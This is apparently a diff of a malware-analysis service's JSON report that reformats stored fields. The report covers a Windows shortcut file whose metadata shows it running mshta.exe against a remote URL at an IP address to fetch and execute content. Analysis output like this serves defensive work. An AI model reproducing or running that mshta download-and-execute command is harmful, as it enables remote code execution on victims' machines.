@@ -5,7 +5,27 @@
     "sections": [
       {
         "auto_collapse": false,
-        "body": "{\"type\": \"colormap\", \"data\": {\"domain\": [0, 8], \"values\": [4.156833038239749, 3.771951268197278, 2.6431772147067596, 0.9113771778182536, 0.0, 1.2270259643450396, 1.082595095601575, 0.0, 2.5374272479837394, 4.233976322426592]}}",
+        "body": {
+          "data": {
+            "domain": [
+              0,
+              8
+            ],
+            "values": [
+              4.156833038239749,
+              3.771951268197278,
+              2.6431772147067596,
+              0.9113771778182536,
+              0.0,
+              1.2270259643450396,
+              1.082595095601575,
+              0.0,
+              2.5374272479837394,
+              4.233976322426592
+            ]
+          },
+          "type": "colormap"
+        },
         "body_config": {},
         "body_format": "GRAPH_DATA",
         "classification": "TLP:C",
@@ -18,7 +38,23 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"flags\": \"IDList, LinkInfo, CommandArgs, IconFile, Unicode, ExpString, ExpIcon\", \"file_attributes\": \"Archive\", \"create_date\": \"2019:12:29 14:27:21+00:00\", \"access_date\": \"2019:12:29 14:27:21+00:00\", \"modify_date\": \"2018:01:01 04:48:41+00:00\", \"target_file_size\": 14848, \"icon_index\": 1, \"run_window\": \"Normal\", \"hot_key\": \"(none)\", \"target_file_dosname\": \"mshta.exe\", \"drive_type\": \"Fixed Disk\", \"local_base_path\": \"C:\\\\Windows\\\\System32\\\\mshta.exe\", \"command_line_arguments\": \"http://194.180.174.158/18.01/quicker.rtf\", \"icon_file_name\": \"C:\\\\Program Files (x86)\\\\quicker.EXE\", \"machine_id\": \"desktop-farl139\"}",
+        "body": {
+          "access_date": "2019:12:29 14:27:21+00:00",
+          "command_line_arguments": "http://194.180.174.158/18.01/quicker.rtf",
+          "create_date": "2019:12:29 14:27:21+00:00",
+          "drive_type": "Fixed Disk",
+          "file_attributes": "Archive",
+          "flags": "IDList, LinkInfo, CommandArgs, IconFile, Unicode, ExpString, ExpIcon",
+          "hot_key": "(none)",
+          "icon_file_name": "C:\\Program Files (x86)\\quicker.EXE",
+          "icon_index": 1,
+          "local_base_path": "C:\\Windows\\System32\\mshta.exe",
+          "machine_id": "desktop-farl139",
+          "modify_date": "2018:01:01 04:48:41+00:00",
+          "run_window": "Normal",
+          "target_file_dosname": "mshta.exe",
+          "target_file_size": 14848
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
@@ -105,7 +141,9 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"machine_identifier\": \"desktop-farl139\"}",
+        "body": {
+          "machine_identifier": "desktop-farl139"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
@@ -125,7 +163,10 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"local_base_path\": \"C:\\\\Windows\\\\System32\\\\mshta.exe\", \"target_file_dosname\": \"Windows\\\\System32\\\\mshta.exe\"}",
+        "body": {
+          "local_base_path": "C:\\Windows\\System32\\mshta.exe",
+          "target_file_dosname": "Windows\\System32\\mshta.exe"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
